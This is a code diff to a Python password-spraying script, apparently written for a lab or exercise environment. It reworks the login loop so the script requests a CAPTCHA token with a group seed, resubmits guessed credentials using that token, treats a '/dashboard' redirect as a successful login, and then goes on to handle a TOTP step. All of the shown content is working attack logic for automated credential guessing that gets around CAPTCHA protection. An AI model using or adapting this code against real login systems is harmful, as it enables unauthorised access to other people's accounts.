@@ -49,31 +49,35 @@ def password_spraying():
                                 
                                 
                         # ----- CAPTCHA -----
-                        data = response.json()
+                        if code_resp == 603:
+                            data = response.json()
 
-                        if data.get("captcha_required"):
-                            captcha = requests.post(
-                                CAPTCHA_URL + f"?group_seed={GROUP_SEED}",
-                                cookies=response.cookies
-                                )
+                            if data.get("captcha_required"):
+                                captcha = requests.post(
+                                    CAPTCHA_URL ,
+                                    data={"group_seed":GROUP_SEED},
+                                    cookies=response.cookies
+                                    )
+                                
+                                data_captcha = captcha.json()
                             
-                            data_captcha = captcha.json()
-                        
-                        if not data_captcha.get("captcha_required"):
-                            requests.post(
-                                LOGIN_URL,
-                                data={
-                                    "username": user,
-                                    "password": password,
-                                    "captcha_token": data_captcha.get("captcha_token")
-                                },
-                                cookies=response.cookies
-                            )   
-                            if 
-                                
-                                
+                                if not data_captcha.get("captcha_required"):
+                                    response = requests.post(
+                                        LOGIN_URL,
+                                        data={
+                                            "username": user,
+                                            "password": password,
+                                            "captcha_token": data_captcha.get("captcha_token")
+                                        },
+                                        cookies=response.cookies
+                                    )  
+                                    success, code_resp = "/dashboard" in response.url, response.status_code 
+                                    if success:
+                                        continue
+                                    
+                           
                         #------ TOTP -------
-                        if code_resp == 500: #If TOTP is required.
+                        if code_resp == 503: #If TOTP is required.
                             
                             totp_response = requests.post(
                                 LOGIN_TOTP_URL,  # TOTP verification URL
